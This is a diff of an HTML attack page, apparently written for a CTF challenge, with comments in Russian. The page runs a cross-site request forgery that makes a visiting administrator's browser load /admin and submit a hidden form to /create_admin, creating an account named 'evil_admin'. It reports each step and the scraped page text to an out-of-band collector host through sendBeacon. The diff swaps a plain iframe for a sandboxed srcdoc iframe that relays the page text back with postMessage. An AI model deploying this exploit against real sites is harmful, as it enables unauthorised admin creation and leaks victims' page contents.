@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="attack" name="attack" style="display:none"></iframe>
-
 <script>
 const TARGET = "https://tasks.goidactf.ru:20385";
 const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
@@ -10,76 +8,79 @@ const ADMIN = "evil_admin";
 
 const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
 
-// Шаг 1: Открываем страницу /admin в iframe
-const form1 = document.createElement('form');
-form1.action = TARGET + "/admin";
-form1.method = "GET";
-form1.target = "attack";
-form1.style.display = "none";
-document.body.appendChild(form1);
+// Создаем iframe с srcdoc для лучшего контроля
+const iframe = document.createElement('iframe');
+iframe.name = 'attackFrame';
+iframe.sandbox = 'allow-scripts allow-same-origin allow-forms';
+iframe.style.display = 'none';
 
-// Шаг 2: Создаем форму для создания админа
-const form2 = document.createElement('form');
-form2.action = TARGET + "/create_admin";
-form2.method = "POST";
-form2.target = "attack";
-form2.style.display = "none";
-
-const input = document.createElement('input');
-input.type = "hidden";
-input.name = "new_admin_login";
-input.value = ADMIN;
-form2.appendChild(input);
-document.body.appendChild(form2);
-
-// Запускаем
-setTimeout(() => {
-    form1.submit();
-    log("step1_admin_loaded");
+// srcdoc с нашей атакой
+iframe.srcdoc = `
+    <!DOCTYPE html>
+    <html>
+    <body>
+    <div id="status">Loading...</div>
     
-    setTimeout(() => {
-        form2.submit();
-        log("step2_create_admin_submitted");
+    <form id="loadForm" method="GET" action="${TARGET}/admin"></form>
+    <form id="createForm" method="POST" action="${TARGET}/create_admin">
+        <input type="hidden" name="new_admin_login" value="${ADMIN}">
+    </form>
+    
+    <script>
+        let step = 0;
         
-        // Ключевой момент: ждем и пытаемся прочитать статус див
-        setTimeout(() => {
+        function sendResult() {
+            const statusDiv = document.getElementById('status');
+            const text = statusDiv ? statusDiv.textContent : 'no status div';
+            
+            // Отправляем результат родителю
             try {
-                const iframe = document.getElementById('attack');
-                const doc = iframe.contentDocument;
-                
-                // Ищем div с id="status"
-                const statusDiv = doc.getElementById('status');
-                if (statusDiv) {
-                    const text = statusDiv.textContent || statusDiv.innerText;
-                    log("STATUS_DIV_CONTENT: " + text);
-                    
-                    // Анализируем содержимое
-                    if (text.includes('401') || text.includes('MOTHER FUCKER') || text.includes('NOT')) {
-                        log("RESULT=401_UNAUTHORIZED");
-                    } else if (text.includes('Status: 200') || text.includes('Status:20')) {
-                        log("RESULT=200_SUCCESS");
-                    } else if (text.includes('Status:')) {
-                        const match = text.match(/Status:\s*(\d+)/);
-                        log("RESULT=STATUS_" + (match ? match[1] : 'unknown'));
-                    }
-                } else {
-                    log("STATUS_DIV_NOT_FOUND");
-                    
-                    // Пробуем найти по другим способам
-                    const allDivs = doc.getElementsByTagName('div');
-                    for (let i = 0; i < allDivs.length; i++) {
-                        const divText = allDivs[i].textContent;
-                        if (divText.includes('401') || divText.includes('Status:')) {
-                            log("FOUND_DIV_" + i + ": " + divText.substring(0, 100));
-                        }
-                    }
-                }
+                parent.postMessage({
+                    type: 'status',
+                    step: step,
+                    content: text,
+                    fullText: document.body.textContent.substring(0, 500)
+                }, '*');
             } catch(e) {
-                log("READ_ERROR: " + e.message);
+                console.log('postMessage error:', e);
             }
-        }, 3000);
-    }, 1500);
-}, 500);
+            
+            step++;
+        }
+        
+        // Начальная загрузка
+        document.getElementById('loadForm').submit();
+        
+        // Проверяем периодически
+        setInterval(sendResult, 1000);
+        
+        // Через 2 секунды отправляем форму создания
+        setTimeout(() => {
+            document.getElementById('createForm').submit();
+        }, 2000);
+    <\\/script>
+    </body>
+    </html>
+`;
+
+// Обработчик сообщений от iframe
+window.addEventListener('message', (event) => {
+    if (event.data && event.data.type === 'status') {
+        const data = event.data;
+        log(`iframe_step_${data.step}: ${data.content.substring(0, 200)}`);
+        
+        // Анализируем содержимое
+        if (data.content.includes('401') || data.content.includes('MOTHER FUCKER')) {
+            log("DETECTED_401_RESPONSE");
+        } else if (data.content.includes('Status:')) {
+            const match = data.content.match(/Status:\s*(\d+)/);
+            log(`DETECTED_STATUS_${match ? match[1] : 'unknown'}`);
+        }
+    }
+});
+
+document.body.appendChild(iframe);
+log("attack_started");
 </script>
 </body>
 </html>
